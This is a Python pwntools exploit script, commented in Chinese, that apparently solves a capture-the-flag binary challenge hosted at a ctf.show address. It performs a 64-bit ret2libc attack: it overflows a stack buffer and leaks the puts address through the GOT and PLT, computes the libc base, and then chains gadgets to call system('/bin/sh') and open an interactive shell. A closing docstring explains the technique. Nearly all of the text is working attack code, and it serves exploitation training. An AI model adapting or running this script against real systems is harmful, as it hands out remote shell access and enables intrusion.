from pwn import *

context(arch = 'amd64', os = 'linux', log_level = 'debug')

io = remote("pwn.challenge.ctf.show", 28226)
elf = ELF('./pwn')
libc = ELF('./libc.so.6')

# offset = 0x40 + 8：计算到返回地址的偏移量
# 0x40是缓冲区大小，8是64位程序的rbp大小
offset = 0x40 + 8

# ret_addr = 0x4004c6：ret指令的地址，用于栈对齐
ret_addr = 0x4004c6

# pop_rdi_ret = 0x4007a3：pop rdi; ret gadget的地址
pop_rdi_ret = 0x4007a3

# 等待提示信息
io.recvuntil(b"Let's go")

# 构造第一次payload，用于泄露puts函数的地址
# b'a' * offset：填充到返回地址
# p64(pop_rdi_ret)：执行pop rdi; ret，将puts_got弹出到rdi
# p64(elf.got['puts'])：puts函数的GOT表地址，作为puts的参数
# p64(elf.plt['puts'])：调用puts函数，打印puts的GOT表内容
# p64(elf.sym['main'])：puts返回后跳回main函数
payload = b'a' * offset + p64(pop_rdi_ret) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(elf.sym['main'])
io.sendline(payload)

# 接收并解析泄露的puts函数地址
puts_addr = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))

# 计算libc基址、/bin/sh地址和system函数地址
libc_base = puts_addr - libc.sym['puts']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))
system_addr = libc_base + libc.sym['system']

# 等待提示信息
io.recvuntil(b"Let's go")

# 构造第二次payload，用于执行system('/bin/sh')
# b'a' * offset：填充到返回地址
# p64(pop_rdi_ret)：执行pop rdi; ret，将bin_sh弹出到rdi
# p64(bin_sh)：/bin/sh地址，作为system的参数
# p64(ret_addr)：ret指令，用于栈对齐
# p64(system_addr)：调用system函数
payload = b'a' * offset + p64(pop_rdi_ret) + p64(bin_sh) + p64(ret_addr) + p64(system_addr)
io.sendline(payload)

io.interactive()

"""
【知识点讲解】
1. 题目类型：ret2libc - 64位ret2libc攻击
2. 核心原理：
   - 利用栈溢出漏洞构造ROP链
   - 泄露puts函数的地址，计算libc基址
   - 构造ROP链执行system('/bin/sh')
3. 关键步骤：
   - 构造第一次payload，泄露puts地址
   - 计算libc基址和system函数地址
   - 构造第二次payload，执行system('/bin/sh')
4. 执行流程：
   - 第一次payload：泄露puts地址 -> 第二次payload：执行system获取shell
5. 技术要点：
   - 64位ROP链构造
   - 信息泄露技术
   - 栈对齐处理
"""
